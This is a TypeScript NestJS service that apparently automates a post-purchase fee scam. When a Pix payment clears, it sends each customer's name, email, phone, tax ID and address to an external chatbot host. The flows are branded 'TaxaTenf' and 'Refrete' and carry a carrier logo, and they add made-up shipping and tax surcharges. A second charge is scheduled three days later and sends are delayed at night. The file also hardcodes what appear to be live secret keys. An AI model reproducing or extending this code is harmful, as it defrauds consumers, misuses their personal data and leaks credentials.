import { Injectable } from '@nestjs/common';
import { PrismaClient } from '@prisma/client';
var privateKey = "admin_live_YuTvvox0zgoqUVsNQLRQovZmS0BW1u"
import * as fs from 'fs'
import { Agenda } from 'agenda';

async function startFlowTypebotTENF(item, codigoRastreio) {
  var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

var raw = JSON.stringify({
  "prefilledVariables": {
    "clientEmail": item.customer.email,
    "clientName": item.customer.name,
    "clientPhone": item.customer.phone,
    "codigoRastreio": codigoRastreio,
    "cep": item.customer?.address?.zipCode || "70872050",
    "data": new Date().toLocaleDateString(),
   "logoUrl": `https://s3.rastreou.org/cod-rastreio/sas.png`,
    "horario": new Date().toLocaleTimeString(),
    "endereco": item.customer.address?.street,
    "state": item.customer.address?.state,
    "valor": (item.amount / 100).toString(),
    "frete": ((item.shipping?.amount / 100 || 0) + 17.98).toString(),
    "storeName": "TaxaTenf",
    "clientDocument": item.customer.document.number,
    "productsHtml": item.items.map((item) => {
      return `
      <tr>
<td style="border-collapse: collapse;"></td>
</tr>
<tr>
<td style="border-collapse: collapse; width: 75px;">
<img src="https://s3.rastreou.org/cod-rastreio/placeholder.png"
    style="width:50px; border: 2px solid; border-radius: 10px;">
</td>
<td style="border-collapse: collapse;">
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    <strong>
      ${item.title}
    </strong></p>
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    ${item.quantity} un. x R$&nbsp;${item.unitPrice/100}</p>
</td>
</tr>

<tr>
<td style="border-collapse: collapse;"></td>
</tr>
      `
    }).join("\n")
  },
  "isOnlyRegistering": false,
  "isStreamEnabled": false,
  "textBubbleContentFormat": "richText"
});
const resp = await fetch("https://typechat.ads-information.top/api/v1/typebots/taxa-tenf-no-payment-dtk74jr/startChat", {
  method: 'POST',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
})
const data = await resp.json()
console.log(data)
if(resp.status == 200){
  return "ok"
}
throw new Error("Erro ao iniciar chat")

}

async function startFlowTypebotREFRETE(item, codigoRastreio) {
  var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

var raw = JSON.stringify({
  "prefilledVariables": {
    "clientEmail": item.customer.email,
    "clientName": item.customer.name,
    "clientPhone": item.customer.phone,
    "clientDocument": item.customer.document.number,
    "codigoRastreio": codigoRastreio,
    "cep": item.customer?.address?.zipCode || "70872050",
    "data": new Date().toLocaleDateString(),
    "logoUrl": `https://s3.rastreou.org/cod-rastreio/jadlog.png`,
    "horario": new Date().toLocaleTimeString(),
    "endereco": item.customer.address?.street,
    "state": item.customer.address?.state,
    "valor": (item.amount / 100).toString(),
    "frete": ((item.shipping?.amount / 100 || 0) + 27.99).toString(),
    "storeName": "Refrete",
    "productsHtml": item.items.map((item) => {
      return `
      <tr>
<td style="border-collapse: collapse;"></td>
</tr>
<tr>
<td style="border-collapse: collapse; width: 75px;">
<img src="https://s3.rastreou.org/cod-rastreio/placeholder.png"
    style="width:50px; border: 2px solid; border-radius: 10px;">
</td>
<td style="border-collapse: collapse;">
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    <strong>
      ${item.title}
    </strong></p>
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    ${item.quantity} un. x R$&nbsp;${item.unitPrice/100}</p>
</td>
</tr>

<tr>
<td style="border-collapse: collapse;"></td>
</tr>
      `
    }).join("\n")
  },
  "isOnlyRegistering": false,
  "isStreamEnabled": false,
  "textBubbleContentFormat": "richText"
});

const resp = await fetch("https://typechat.ads-information.top/api/v1/typebots/taxa-tenf-no-payment-7x6xv4s/startChat", {
  method: 'POST',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
})
const data = await resp.json()
if(resp.status == 200){
  return "ok"
}
throw new Error("Erro ao iniciar chat")

}
const prisma = new PrismaClient()
@Injectable()
export class AppService {
  constructor(
    private readonly agenda: Agenda
  ) {}
  async handle(body:any) {
    console.log("body", body.data.id)
    if(body.type == "transaction"){
      let data = body.data

      // sk_live_WuFHQbIoHmAZgpIDHn4YBfqGhjFOIOFC9hFNQxO3Oa
      // 85603290
      if(!data){
        console.log("Erro ao buscar transação")
        return
      }
      let isPhysical = data.items.some((item) => item.tangible)

      const isNight = new Date().getHours() >= 22 || new Date().getHours() <= 5
      // const isNight = false
      if(data.status == 'paid' && data.customer?.address?.zipCode && data.paymentMethod == 'pix'){
        if(await prisma.sents.findFirst({
          where: {
            transactionId: data.id.toString()
            }
            })){
              return
            }
            
        if(isNight){
          return await prisma.sentsPending.create({
            data: {
              data: body,
            }
          })
        }
        console.log("Iniciando chat")
        await startFlowTypebotTENF(data, data.id)

        if(isPhysical){
          // 3 dias
          await this.agenda.schedule(
            new Date(Date.now() + 1000 * 60 * 60 * 24 * 3),
             'refrete', data)
          // await startFlowTypebotREFRETE(data, data.id)

        }
        await prisma.sents.create({
          data: {
            data: data,
            transactionId: data.id.toString()
          }
        })

      }

    }
  }
}
